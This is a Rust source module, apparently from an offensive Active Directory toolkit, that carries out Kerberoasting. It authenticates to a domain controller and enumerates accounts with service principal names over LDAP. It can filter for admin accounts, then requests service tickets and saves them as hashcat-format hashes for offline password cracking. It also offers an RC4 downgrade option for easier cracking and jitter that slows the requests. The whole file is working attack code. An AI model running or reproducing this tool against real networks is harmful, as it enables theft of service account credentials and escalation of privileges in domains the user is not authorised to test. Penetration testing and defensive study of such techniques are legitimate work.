//! Kerberoasting — Enumerate accounts with SPNs and extract TGS tickets
//! for offline cracking (hashcat mode 13100/19700).
//!
//! Flow:
//! 1. Authenticate and obtain TGT
//! 2. LDAP query for user accounts with servicePrincipalName
//! 3. Request TGS for each SPN via TGS-REQ
//! 4. Extract encrypted ticket → hashcat format

use crate::runner::HuntConfig;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// UAC constants
// ═══════════════════════════════════════════════════════════

#[allow(dead_code)] // Protocol reference UAC flag
const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_NORMAL_ACCOUNT: u32 = 0x00000200;

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct KerberoastConfig {
    /// Specific SPNs to target (skip LDAP enumeration if provided)
    pub target_spns: Vec<String>,
    /// Skip disabled accounts
    pub skip_disabled: bool,
    /// Skip machine accounts ($ suffix)
    pub skip_machine_accounts: bool,
    /// Only target specific encryption types
    pub target_etypes: Vec<i32>,
    /// Output file for hashes
    pub output_file: Option<PathBuf>,
    /// Only target admin accounts (adminCount=1)
    pub admin_only: bool,
    /// Downgrade to RC4 (request only etype 23) for easier cracking
    pub downgrade_to_rc4: bool,
}

impl Default for KerberoastConfig {
    fn default() -> Self {
        Self {
            target_spns: Vec::new(),
            skip_disabled: true,
            skip_machine_accounts: true,
            target_etypes: vec![
                kerberos::ETYPE_RC4_HMAC,
                kerberos::ETYPE_AES256_CTS,
                kerberos::ETYPE_AES128_CTS,
            ],
            output_file: None,
            admin_only: false,
            downgrade_to_rc4: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastResult {
    pub hashes: Vec<RoastedService>,
    pub spns_checked: usize,
    pub skipped: Vec<(String, String)>,
    pub errors: Vec<(String, String)>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RoastedService {
    pub username: String,
    pub spn: String,
    pub domain: String,
    pub etype: String,
    pub hash_string: String,
    pub distinguished_name: Option<String>,
    pub admin_count: bool,
    pub password_last_set: Option<String>,
}

// ═══════════════════════════════════════════════════════════
// LDAP Enumeration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
struct SpnAccount {
    sam_account_name: String,
    spns: Vec<String>,
    distinguished_name: String,
    admin_count: bool,
    password_last_set: Option<String>,
}

/// Enumerate user accounts with SPNs using the high-level LdapSession API
async fn enumerate_spn_accounts(
    config: &HuntConfig,
    kc: &KerberoastConfig,
) -> Result<Vec<SpnAccount>> {
    info!("LDAP: Enumerating SPN accounts (kerberoastable)");

    let mut conn = if config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    };

    let ad_users = conn.find_kerberoastable().await?;

    let mut accounts = Vec::new();

    for u in &ad_users {
        // Skip disabled accounts
        if kc.skip_disabled && !u.enabled {
            debug!("Skipping disabled account: {}", u.sam_account_name);
            continue;
        }

        // Skip machine accounts
        if kc.skip_machine_accounts && u.sam_account_name.ends_with('$') {
            debug!("Skipping machine account: {}", u.sam_account_name);
            continue;
        }

        // Skip krbtgt (always has SPN, never useful)
        if u.sam_account_name.to_lowercase() == "krbtgt" {
            continue;
        }

        if u.service_principal_names.is_empty() {
            continue;
        }

        // Admin-only filter
        if kc.admin_only && !u.admin_count {
            continue;
        }

        accounts.push(SpnAccount {
            sam_account_name: u.sam_account_name.clone(),
            spns: u.service_principal_names.clone(),
            distinguished_name: u.distinguished_name.clone(),
            admin_count: u.admin_count,
            password_last_set: u.pwd_last_set.clone(),
        });
    }

    conn.disconnect().await?;
    info!("LDAP: Found {} kerberoastable accounts", accounts.len());
    Ok(accounts)
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<KerberoastResult> {
    info!("{}", "═══ KERBEROAST ═══".bold().yellow());

    // Step 1: Get or request TGT
    let tgt = match &config.tgt {
        Some(t) => t.clone(),
        None => {
            kerberos::request_tgt(
                &config.dc_ip,
                &config.domain,
                &config.username,
                &config.secret,
                config.use_hash,
            )
            .await?
        }
    };

    // Step 2: Enumerate SPN accounts (or use provided list)
    #[allow(clippy::type_complexity)]
    let spn_targets: Vec<(String, String, Option<String>, bool, Option<String>)> =
        if kc.target_spns.is_empty() {
            let accounts = enumerate_spn_accounts(config, kc).await?;
            let mut targets = Vec::new();
            for acct in accounts {
                // Use first SPN for each account
                if let Some(spn) = acct.spns.first() {
                    targets.push((
                        acct.sam_account_name,
                        spn.clone(),
                        Some(acct.distinguished_name),
                        acct.admin_count,
                        acct.password_last_set,
                    ));
                }
            }
            targets
        } else {
            kc.target_spns
                .iter()
                .map(|spn| ("unknown".to_string(), spn.clone(), None, false, None))
                .collect()
        };

    if spn_targets.is_empty() {
        warn!("No kerberoastable accounts found");
        return Ok(KerberoastResult {
            hashes: Vec::new(),
            spns_checked: 0,
            skipped: Vec::new(),
            errors: Vec::new(),
        });
    }

    // Step 3: Request TGS for each SPN
    let pb = ProgressBar::new(spn_targets.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.yellow/dim}] {pos}/{len} Kerberoasting {msg}")
            .unwrap()
            .progress_chars("█▓░"),
    );

    let mut hashes = Vec::new();
    let mut skipped = Vec::new();
    let mut errors = Vec::new();

    for (sam, spn, dn, admin_count, pwd_last_set) in &spn_targets {
        pb.set_message(spn.clone());

        match kerberos::kerberoast(&config.dc_ip, &tgt, spn).await {
            Ok(crackable) => {
                let etype_label = match crackable.hash_string.as_str() {
                    s if s.contains("$krb5tgs$23$") => "RC4",
                    s if s.contains("$krb5tgs$18$") => "AES256",
                    s if s.contains("$krb5tgs$17$") => "AES128",
                    _ => "unknown",
                };

                let roasted = RoastedService {
                    username: sam.clone(),
                    spn: spn.clone(),
                    domain: config.domain.clone(),
                    etype: etype_label.to_string(),
                    hash_string: crackable.hash_string,
                    distinguished_name: dn.clone(),
                    admin_count: *admin_count,
                    password_last_set: pwd_last_set.clone(),
                };

                let marker = if *admin_count {
                    " [ADMIN]".red().bold().to_string()
                } else {
                    String::new()
                };
                info!(
                    "  {} {} ({}) — {} {}{}",
                    "✓".green(),
                    sam.bold(),
                    spn.dimmed(),
                    "etype:".dimmed(),
                    etype_label.cyan(),
                    marker
                );
                hashes.push(roasted);
            }
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("S_PRINCIPAL_UNKNOWN") {
                    debug!("  {} {} — SPN not found", "→".dimmed(), spn);
                    skipped.push((spn.clone(), "SPN not found".to_string()));
                } else {
                    warn!("  {} {} — {}", "✗".red(), spn, err_str);
                    errors.push((spn.clone(), err_str));
                }
            }
        }

        config.apply_jitter().await;
        pb.inc(1);
    }
    pb.finish_with_message("done");

    // Step 4: Save hashes
    if let Some(ref output_path) = kc.output_file {
        let hash_lines: String = hashes
            .iter()
            .map(|h| h.hash_string.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(output_path, &hash_lines).await?;
        info!("Saved {} hashes to {}", hashes.len(), output_path.display());
    }

    info!(
        "Kerberoast: {} hashes, {} skipped, {} errors",
        hashes.len().to_string().green(),
        skipped.len(),
        errors.len()
    );

    Ok(KerberoastResult {
        spns_checked: spn_targets.len(),
        hashes,
        skipped,
        errors,
    })
}
